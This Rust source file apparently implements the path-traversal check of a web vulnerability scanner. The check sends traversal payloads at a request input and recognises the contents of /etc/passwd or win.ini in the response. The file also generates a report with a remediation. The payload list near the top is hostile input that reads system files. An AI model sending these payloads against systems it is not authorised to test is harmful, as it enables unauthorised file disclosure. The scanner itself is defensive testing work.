//! `input.traversal` — whether an input reaches the filesystem as a path.
//!
//! An input used to build a filename, asked for a file it should never name. The proof
//! is not "the request looked like traversal" but "a file that is not part of this
//! application came back in the response, and the untouched request did not return it":
//!
//! ```text
//! value=../../../../../../etc/passwd   → root:x:0:0:root:/root:/bin/bash …
//! value=<original>                     → the ordinary page.
//! ```
//!
//! The signature is the *content* of a file outside the web root — the passwd shape on
//! Unix, `win.ini`'s sections on Windows — because that content is what an application
//! serving its own files would never emit. A path that merely 404s proves nothing; a
//! path that returns `/etc/passwd` proves everything.
//!
//! Read-only, and only the files every system has. It never writes and never names a
//! file that would not already be world-readable on a default install.

use async_trait::async_trait;
use nullhawk_types::finding::{
    Evidence, FindingSource, Hypothesis, Location, MessagePart, Severity,
};
use nullhawk_types::inject::{inputs, inputs_in, substitute, value_at};
use nullhawk_types::object::ObjectLocation;
use nullhawk_types::verify::{
    DetectorId, DetectorInfo, DetectorMode, Support, Verification, Writeup,
};
use nullhawk_types::Result;
use nullhawk_verify::Lab;

use crate::{ActiveCheck, Budget, Subject};

/// The check.
pub struct PathTraversal;

const SETTLES: &str = "input.traversal";

const INFO: DetectorInfo = DetectorInfo {
    id: DetectorId("input.traversal"),
    name: "Path traversal",
    version: "1.0.0",
    about: "whether an input is used to build a filesystem path — proven by the content \
            of a file outside the application coming back in the response",
    mode: DetectorMode::Active,
    observes: false,
    hypothesizes: false,
    settles: Some(SETTLES),
};

/// Traversal payloads, unix then windows, plain then encoded. Deep enough to escape a
/// nested directory, and only well-known world-readable files.
const PAYLOADS: &[&str] = &[
    "../../../../../../../../etc/passwd",
    "....//....//....//....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5c..%5c..%5c..%5cwindows%5cwin.ini",
];

#[async_trait]
impl ActiveCheck for PathTraversal {
    fn about(&self) -> DetectorInfo {
        INFO
    }

    fn handles(&self, hypothesis: &Hypothesis) -> bool {
        hypothesis.detector == SETTLES
    }

    async fn settle(
        &self,
        subject: &Subject,
        lab: &dyn Lab,
        budget: &Budget,
    ) -> Result<Verification> {
        let Some(slot) = slot_named(subject) else {
            return Ok(Verification::Inconclusive {
                why: format!(
                    "the input this was raised about is no longer in {} {}, so there was \
                     nothing to point at a file",
                    subject.exchange.method, subject.exchange.url
                ),
            });
        };
        let base = value_at(&subject.draft.request, &slot).unwrap_or_default();

        // A control: the untouched input must not already return a system file, or a
        // match below would prove nothing about the payload.
        let baseline = match probe(subject, lab, &slot, &base).await {
            Attempt::Answered(a) => a,
            Attempt::Failed(why) => return Ok(Verification::Inconclusive { why }),
        };
        if leaked_file(&baseline.body).is_some() {
            return Ok(Verification::Inconclusive {
                why: "the untouched request already returned something that looks like a \
                      system file, so a payload match here would not be attributable"
                    .into(),
            });
        }

        // One request already spent on the baseline, so the nth payload is the (n+1)th
        // request; stop before the budget is exceeded.
        for (spent, payload) in (1usize..).zip(PAYLOADS.iter()) {
            if spent >= budget.per_hypothesis.max(1) {
                break;
            }
            let Attempt::Answered(answer) = probe(subject, lab, &slot, payload).await else {
                continue;
            };
            if let Some(file) = leaked_file(&answer.body) {
                return Ok(Verification::Reproduced {
                    note: format!(
                        "{} set to a traversal sequence returned the contents of {}, and \
                         the untouched request did not — the input reaches the filesystem \
                         as a path",
                        describe(&slot),
                        file.name,
                    ),
                    evidence: vec![
                        from_exchange(subject),
                        Evidence::Comparison {
                            baseline: baseline.request,
                            variant: answer.request,
                            difference: format!(
                                "the payload `{payload}` returned {} ({}); the original \
                                 value did not",
                                file.name, file.excerpt,
                            ),
                        },
                    ],
                });
            }
        }

        Ok(Verification::Refuted {
            note: format!(
                "no traversal payload in {} returned a file from outside the application — \
                 this input shows no sign of being used as a filesystem path",
                describe(&slot),
            ),
        })
    }

    fn writeup(&self, subject: &Subject, verification: &Verification) -> Writeup {
        let slot = slot_named(subject);
        let where_ = slot
            .as_ref()
            .map(describe)
            .unwrap_or_else(|| "an input".into());

        Writeup {
            target: subject.target,
            title: format!(
                "Path traversal in {} of {} {}",
                where_,
                subject.exchange.method,
                path_of(&subject.exchange.url),
            ),
            description: format!(
                "A value placed in {where_} of {} {} is used to build a filesystem path, \
                 and a traversal sequence reached a file outside the application. {}\n\nThe \
                 evidence names the file that came back and the payload that fetched it.",
                subject.exchange.method,
                subject.exchange.url,
                sentence(verification.note()),
            ),
            impact: "An input used to build a file path without confinement lets a caller \
                     read files outside the intended directory — configuration, source, \
                     credentials, keys — and, where the path is also written or included, \
                     can escalate to code execution."
                .into(),
            remediation: "Resolve the path and verify it stays within an allowed base \
                          directory (canonicalise, then check the prefix); reject separators \
                          and encoded separators in a filename. Prefer an opaque identifier \
                          mapped to a file server-side over a caller-supplied path."
                .into(),
            reproduction: format!(
                "Send {} {} with {where_} set to the traversal payload the evidence records \
                 and read the response body. `nullhawk poc <project> <finding>` compiles the \
                 exact request.",
                subject.exchange.method, subject.exchange.url,
            ),
            cwe: Some("CWE-22".into()),
            owasp: Some("A01:2021 Broken Access Control".into()),
            source: FindingSource::ActiveScan {
                detector: INFO.id.to_string(),
                version: INFO.version.to_string(),
            },
            severity: severity_for(verification),
            location: slot
                .as_ref()
                .map(|slot| Location {
                    part: part_of(slot),
                    name: name_of(slot),
                })
                .or(subject.hypothesis.location.clone()),
        }
    }
}

fn severity_for(verification: &Verification) -> Severity {
    match verification {
        Verification::Reproduced { .. } => Severity::High,
        Verification::Supported {
            support: Support::Distinctive,
            ..
        } => Severity::Medium,
        _ => Severity::Low,
    }
}

struct Leaked {
    name: &'static str,
    excerpt: String,
}

/// Whether a body carries the content of a well-known system file. Content, not a path:
/// the passwd *shape* (a `root:` line with two zero ids) and win.ini's sections are things
/// an application serving its own pages does not emit.
fn leaked_file(body: &[u8]) -> Option<Leaked> {
    let text = String::from_utf8_lossy(body);
    for line in text.lines() {
        if line.starts_with("root:") && line.contains(":0:0:") {
            return Some(Leaked {
                name: "/etc/passwd",
                excerpt: line.chars().take(48).collect(),
            });
        }
    }
    let lower = text.to_ascii_lowercase();
    if lower.contains("[extensions]") || lower.contains("; for 16-bit app support") {
        return Some(Leaked {
            name: "windows\\win.ini",
            excerpt: "[extensions] / 16-bit app support section".into(),
        });
    }
    None
}

struct Answer {
    request: nullhawk_types::ids::RequestId,
    body: Vec<u8>,
}

enum Attempt {
    Answered(Answer),
    Failed(String),
}

async fn probe(subject: &Subject, lab: &dyn Lab, slot: &ObjectLocation, value: &str) -> Attempt {
    let mut draft = subject.draft.clone();
    draft.request = match substitute(&draft.request, slot, value) {
        Ok(request) => request,
        Err(e) => return Attempt::Failed(format!("the payload could not be placed: {e}")),
    };
    match lab.experiment(&draft, None).await {
        Ok(sent) => Attempt::Answered(Answer {
            request: sent.id,
            body: sent.exchange.response.body.to_vec(),
        }),
        Err(e) => Attempt::Failed(e.to_string()),
    }
}

fn from_exchange(subject: &Subject) -> Evidence {
    Evidence::Exchange {
        request: subject.exchange.id,
        response: None,
        note: format!(
            "the captured exchange this was raised from: {} {}",
            subject.exchange.method, subject.exchange.url
        ),
    }
}

fn slot_named(subject: &Subject) -> Option<ObjectLocation> {
    let wanted = subject.hypothesis.location.as_ref()?;
    inputs(&subject.draft.request).into_iter().find(|slot| {
        name_of(slot).eq_ignore_ascii_case(&wanted.name) && part_of(slot) == wanted.part
    })
}

fn describe(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } => format!("the `{name}` query parameter"),
        ObjectLocation::Header { name, .. } => format!("the `{name}` header"),
        other => format!("{other:?}"),
    }
}

fn name_of(slot: &ObjectLocation) -> String {
    match slot {
        ObjectLocation::Query { name, .. } | ObjectLocation::Header { name, .. } => name.clone(),
        other => format!("{other:?}"),
    }
}

fn part_of(slot: &ObjectLocation) -> MessagePart {
    match slot {
        ObjectLocation::Query { .. } => MessagePart::Query,
        ObjectLocation::Header { .. } => MessagePart::Header,
        _ => MessagePart::Body,
    }
}

fn sentence(note: &str) -> String {
    let mut chars = note.chars();
    match chars.next() {
        Some(first) => first.to_uppercase().collect::<String>() + chars.as_str(),
        None => String::new(),
    }
}

fn path_of(url: &str) -> &str {
    url.split_once("://")
        .and_then(|(_, rest)| rest.find('/').map(|at| &rest[at..]))
        .unwrap_or("/")
}

/// Raises one suspicion per input — a work item at `Info`, settled by an experiment.
pub fn suspect(exchange: &nullhawk_scan::Exchange) -> Vec<Hypothesis> {
    inputs_in(&exchange.path, &exchange.request_headers)
        .into_iter()
        .map(|slot| Hypothesis {
            detector: SETTLES.to_string(),
            claim: format!(
                "{} {} — {}",
                exchange.method,
                path_of(&exchange.url),
                describe(&slot),
            ),
            source_request: exchange.id,
            location: Some(Location {
                part: part_of(&slot),
                name: name_of(&slot),
            }),
            provisional_severity: Severity::Info,
        })
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn raised(detector: &str) -> Hypothesis {
        Hypothesis {
            detector: detector.into(),
            claim: "something".into(),
            source_request: nullhawk_types::ids::RequestId::new(),
            location: None,
            provisional_severity: Severity::Info,
        }
    }

    #[test]
    fn it_settles_only_traversal_suspicions() {
        assert!(PathTraversal.handles(&raised(SETTLES)));
        assert!(!PathTraversal.handles(&raised("input.sqli")));
        assert!(!PathTraversal.handles(&raised("input.reflected")));
    }

    #[test]
    fn it_is_active_and_a_settler() {
        let info = PathTraversal.about();
        assert_eq!(info.mode, DetectorMode::Active);
        assert!(info.sends());
        assert_eq!(info.settles, Some(SETTLES));
    }

    #[test]
    fn passwd_content_is_recognised_but_ordinary_pages_are_not() {
        let passwd =
            b"root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n";
        let hit = leaked_file(passwd).expect("passwd recognised");
        assert_eq!(hit.name, "/etc/passwd");
        assert!(leaked_file(b"<html>root: the page about roots</html>").is_none());
        assert!(leaked_file(b"a normal response body").is_none());
    }

    #[test]
    fn win_ini_sections_are_recognised() {
        let ini = b"; for 16-bit app support\r\n[extensions]\r\n[fonts]\r\n";
        assert_eq!(leaked_file(ini).unwrap().name, "windows\\win.ini");
    }

    #[test]
    fn severity_follows_the_experiment() {
        assert_eq!(
            severity_for(&Verification::Reproduced {
                note: String::new(),
                evidence: Vec::new()
            }),
            Severity::High
        );
    }
}
